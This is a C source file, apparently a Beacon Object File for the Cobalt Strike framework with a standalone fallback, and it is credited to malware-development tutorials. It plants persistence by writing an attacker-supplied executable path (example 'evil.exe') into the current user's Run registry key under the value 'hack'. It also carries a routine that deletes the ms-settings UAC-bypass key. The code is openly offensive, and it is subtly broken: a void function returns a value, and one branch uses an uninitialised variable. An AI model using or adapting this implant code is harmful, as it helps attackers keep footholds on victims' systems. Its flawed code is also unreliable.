/*
 * Credits: 
	- @cocomelonc - Malware Development for Ethical Hackers : windows persistence via AppInit_DLLs.
	- John Hammond BOF Tutorial
	- Sektor7's COFF Module
*/
#include "pers-runkeys-imports.h"
#include "pers-runkeys-structs.h"

// Steps: 
// 1. Delete/Reset the subkey/value
// 2. Query them again for confirmation

void DeleteRegKeys(HKEY hkey) {
	if (!RegDeleteKeyExA(hkey, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", KEY_WOW64_64KEY, 0))
		return FALSE;
	return;
}

#ifdef BOF

// Usage: pers-runkeys <evilFullPath> <>
void go(char *args, int alen) {
	datap parser;
	char* exe; 	// Argument expectation: char* exe = "C:\\Users\\Cj\\Documents\\shared\\16.Beacon Object Files\\persistence\\evil.exe";
	char* delResult;
	
	// Prepare data parser
	BeaconDataParse(&parser, args, alen);
	
	// Unpack Data
	exe = BeaconDataExtract(&parser, NULL);
	
	HKEY hkey = NULL;

	BeaconPrintf(CALLBACK_OUTPUT, "[*] Is SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run available?\n");

	// Startup
	LONG res = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE, &hkey);
	if(res == ERROR_SUCCESS) {
		// Create new registry key
		ADVAPI32$RegSetValueExA(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
		ADVAPI32$RegCloseKey(hkey);
	} else { }
	return;
}

#else

int main() {
	char* exe; 	// Argument expectation: char* exe = "C:\\Users\\User\\Documents\\shared\\16.Beacon Object Files\\persistence\\evil.exe";
	char* delResult;
	
	HKEY hkey = NULL;

	PRINT("[*] Is SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run available?\n");

	// Startup
	LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE, &hkey);
	if(res == ERROR_SUCCESS) {
		// Create new registry key
		RegSetValueExA(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
		RegCloseKey(hkey);
	} else {
		PRINT("[*] Is SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run is NOT available.\n");
	 }

	return 0;
}

#endif